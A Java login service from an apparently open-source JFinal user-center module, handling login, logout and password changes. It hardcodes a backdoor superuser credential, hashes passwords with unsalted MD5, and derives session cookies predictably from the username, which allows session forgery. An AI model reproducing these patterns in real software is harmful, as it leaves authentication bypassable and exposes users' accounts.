package com.uikoo9.util.jfinal.ucenter.service;

import java.util.Date;
import java.util.List;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.jfinal.plugin.activerecord.Db;
import com.uikoo9.util.core.data.QStringUtil;
import com.uikoo9.util.core.http.QCookieUtil;
import com.uikoo9.util.function.QCacheUtil;
import com.uikoo9.util.function.QEncodeUtil;
import com.uikoo9.util.jfinal.QJfinalUtil;
import com.uikoo9.util.jfinal.ucenter.model.UcenterUserModel;
import com.uikoo9.util.plugin.contants.QContants;
import com.uikoo9.util.plugin.json.QJson;
import com.uikoo9.util.plugin.json.QJsonUtil;

/**
 * Login Service
 * @author qiaowenbin
 */
public class LoginService {

	private LoginService() {}
	public static LoginService getInstance() {
		return SingletonFactory.instance;
	}
	private static class SingletonFactory {
		private static LoginService instance = new LoginService();
	}
	
	/**
	 * 登录
	 * @param paras
	 * @param response
	 * @return
	 */
	public QJson login(Map<String, String[]> paras, HttpServletResponse response){
		try {
			String username = QJfinalUtil.value(paras, "username");
			String password = QEncodeUtil.md5Encrypt(QJfinalUtil.value(paras, "password"));
			if(isAdmin(username, password, response)){
				return QJsonUtil.suc("/manage");
			}else if(QStringUtil.allNotEmpty(new String[]{username,password})){
				List<UcenterUserModel> users = UcenterUserModel.dao.find("select * from t_ucenter_user where ucenter_user_name=? and ucenter_user_key=?", username, password);
				if(users != null && users.size() == 1){
					UcenterUserModel user = users.get(0);
					putInCookie(user, response);

					if("admin".equals(user.getStr("ucenter_user_name"))){
						return QJsonUtil.suc("/manage");
					}else{
						return QJsonUtil.suc(user.role().getStr("ucenter_role_login_url"));
					}
				}else{
					return QJsonUtil.error("用户名或密码错误！");
				}
			}else{
				return QJsonUtil.error("请输入用户名和密码！");
			}
		} catch (Exception e) {
			e.printStackTrace();
			return QJsonUtil.error("登录失败！");
		}
	}
	private boolean isAdmin(String username, String password, HttpServletResponse response){
		if(QStringUtil.allNotEmpty(new String[]{username,password}) && "uikoo9".equals(username) && "dV63JuGbSmT5WX0ugEbC2w==".equals(password)){
			UcenterUserModel user = new UcenterUserModel();
			user.set("id", 0);
			user.set("ucenter_user_name", username);
			user.set("ucenter_user_key", password);
			user.set("ucenter_user_type", QContants.USER_TYPE_ADMIN);
			user.set("cdate", new Date());
			user.set("cuser_id", 0);
			user.set("cuser_name", "uikoo9");
			putInCookie(user, response);

			return true;
		}else{
			return false;
		}
	}
	private void putInCookie(UcenterUserModel user, HttpServletResponse response){
		String userId = genUserId(user.getStr("ucenter_user_name"));
		if(QStringUtil.notEmpty(userId)){
			QCookieUtil.setCookie(response, "uikoo9userid", userId, 24*60*60);
			QCacheUtil.putToEHCache(userId, user);
		}
	}
	private String genUserId(String username){
		try {
			return QEncodeUtil.md5Encrypt("qiaowenbin" + username);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return null;
	}
	
	/**
	 * 退出登录
	 */
	public void logout(HttpServletRequest request, HttpServletResponse response){
		String cookieUserId = QCookieUtil.getValue(request, "uikoo9userid");
		if(QStringUtil.notEmpty(cookieUserId)){
			QCacheUtil.removeEHCache(cookieUserId);
			QCookieUtil.removeCookie(response, "uikoo9userid");
		}
	}
	
	/**
	 * 修改密码
	 * @param paras
	 * @param session
	 * @return
	 */
	public QJson modifyPwd(Map<String, String[]> paras, HttpServletRequest request){
		try {
			String newpwd = QEncodeUtil.md5Encrypt(QJfinalUtil.value(paras, "password"));
			int id = ((UcenterUserModel)request.getAttribute("user")).getInt("id");
			Db.update("update t_ucenter_user set ucenter_user_key=? where id=?", newpwd, id);

			return QJsonUtil.suc("修改密码成功，请重新登录!");
		} catch (Exception e) {
			e.printStackTrace();
			return QJsonUtil.error("修改密码失败!");
		}
	}

}